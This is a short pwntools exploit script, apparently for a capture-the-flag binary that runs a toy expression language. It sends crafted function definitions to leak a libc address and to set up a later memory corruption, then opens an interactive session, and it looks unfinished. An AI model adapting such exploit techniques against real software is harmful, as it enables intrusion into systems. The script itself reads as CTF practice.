from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 1
if debug == 1:
	p = process('./pwn')
	gdb.attach(p)
else:
	p = remote()

#leak
p.recvuntil('ready>')
p.sendline('def binary> 10 (LHS RHS)\nRHS < LHS;')
p.recvuntil('ready>')
p.sendline('1 > 2;')
p.recvuntil('Evaluated to ')
libc_address_low = int(p.recvline(), 10)
if libc_address_low < 0:
	libc_address_low = ~(abs(libc_address_low) & 0x7fffffff - 1) & 0xffffffff
libc_address_low -= 1
print hex(libc_address_low)
'''
for i in range(1000):
	p.recvuntil('ready>')
	p.sendline('def f(x)\nx=1;')
	p.recvuntil('ready>')
	p.sendline('f(1);')
'''
p.recvuntil('ready>')
p.sendline('def g(x)\nx;')
#gdb.attach(p)
p.recvuntil('ready>')
p.sendline('def f(x)\nfor i = 0, x < i, 1 in\ng(i);')
p.recvuntil('ready>')
p.sendline('f(10);')


p.interactive()
